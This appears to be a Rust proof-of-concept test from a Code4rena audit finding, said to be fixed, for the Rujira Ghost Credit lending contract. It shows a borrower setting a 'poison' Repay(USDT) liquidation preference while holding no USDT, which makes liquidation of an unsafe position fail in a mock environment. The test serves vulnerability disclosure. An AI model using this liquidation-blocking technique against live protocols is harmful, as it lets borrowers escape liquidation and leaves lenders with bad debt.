// Rujira Ghost Credit — Liquidation DoS via Poison Repayment Preference
// Platform: Code4rena | Severity: High | Status: Valid · Fixed (MR #97)
// Researcher: Limbowalker

use crate::tests::support::{BTC, USDC, USDT};
use cosmwasm_std::{coin, coins, Addr, Binary, Decimal, Uint128};
use rujira_ghost_vault::mock::GhostVault;
use rujira_rs::ghost::credit::{AccountResponse, LiquidateMsg};
use rujira_rs_testing::{mock_rujira_app, RujiraApp};
use crate::mock::GhostCredit;

struct Ctx {
    ghost_credit: GhostCredit,
    account: AccountResponse,
}

fn setup(app: &mut RujiraApp, owner: &Addr) -> Ctx {
    let ghost_vault_btc  = GhostVault::create(app, owner, BTC);
    let ghost_vault_usdc = GhostVault::create(app, owner, USDC);
    let ghost_vault_usdt = GhostVault::create(app, owner, USDT);
    let ghost_credit     = GhostCredit::create(app, owner, owner);

    ghost_credit.set_collateral(app, BTC, "0.8");
    ghost_credit.set_vault(app, &ghost_vault_btc);
    ghost_credit.set_vault(app, &ghost_vault_usdc);
    ghost_credit.set_vault(app, &ghost_vault_usdt);

    app.init_modules(|router, _api, storage| {
        router.stargate.with_prices(vec![
            ("BTC",  Decimal::percent(10000)), // $100
            ("USDC", Decimal::one()),
            ("USDT", Decimal::one()),
        ]);
        router.bank.init_balance(
            storage, owner,
            vec![
                coin(1_000_000_000, BTC),
                coin(1_000_000_000, USDC),
                coin(1_000_000_000, USDT),
            ],
        ).unwrap();
    });

    ghost_vault_btc .deposit(app, owner, 1_000_000_000, BTC) .unwrap();
    ghost_vault_usdc.deposit(app, owner, 1_000_000_000, USDC).unwrap();
    ghost_vault_usdt.deposit(app, owner, 1_000_000_000, USDT).unwrap();

    ghost_vault_btc .set_borrower(app, ghost_credit.addr().as_str(), Uint128::MAX).unwrap();
    ghost_vault_usdc.set_borrower(app, ghost_credit.addr().as_str(), Uint128::MAX).unwrap();
    ghost_vault_usdt.set_borrower(app, ghost_credit.addr().as_str(), Uint128::MAX).unwrap();

    ghost_credit.create_account(app, owner, "", "", Binary::new(vec![0]));

    let account_addr = Addr::unchecked(
        "cosmwasm10x7mxuxfufc9naqthz6zpc07vzfvyppx2aamqk0ljdkwnl6d48qq3xx860"
    );
    let account = ghost_credit.query_account(app, &account_addr);

    Ctx { ghost_credit, account }
}

#[test]
fn test_liquidation_dos_via_poison_preference() {
    let mut app = mock_rujira_app();
    let owner   = app.api().addr_make("owner");
    let ctx     = setup(&mut app, &owner);

    // Step 1 — fund credit account with BTC collateral
    app.send_tokens(
        owner.clone(),
        ctx.account.account.clone(),
        &[coin(1_000_000, BTC)], // 1 BTC = $100
    ).unwrap();

    // Step 2 — borrow USDC (50% LTV — healthy position)
    let account = ctx.ghost_credit.query_account(&app, &ctx.account.account);
    ctx.ghost_credit
        .account_borrow(&mut app, &account, 50_000_000, USDC)
        .unwrap();

    // Step 3 — set poison pill preference: Repay(USDT) while holding 0 USDT
    ctx.ghost_credit.account_preference_msgs(
        &mut app,
        &account,
        vec![LiquidateMsg::Repay(USDT.to_string())], // account has 0 USDT
    ).unwrap();

    // Step 4 — crash BTC price to trigger liquidation condition
    app.init_modules(|router, _api, _storage| {
        router.stargate.with_prices(vec![
            ("BTC", Decimal::percent(5000)), // $50 — position is now unsafe
        ]);
    });

    let account = ctx.ghost_credit.query_account(&app, &ctx.account.account);
    assert!(account.ltv >= Decimal::one(), "Position should be liquidatable");

    // Step 5 — liquidator attempts to liquidate — MUST fail
    let err = ctx.ghost_credit.liquidate(
        &mut app,
        &account,
        vec![], // liquidator sends no messages — user's preference runs first
    ).unwrap_err();

    // Step 6 — confirm the error is ZeroDebtTokens from the poison preference
    let err_msg = format!("{:?}", err);
    println!("Liquidation blocked with: {}", err_msg);
    assert!(
        err_msg.contains("ZeroDebtTokens"),
        "Expected ZeroDebtTokens — liquidation permanently blocked"
    );
}
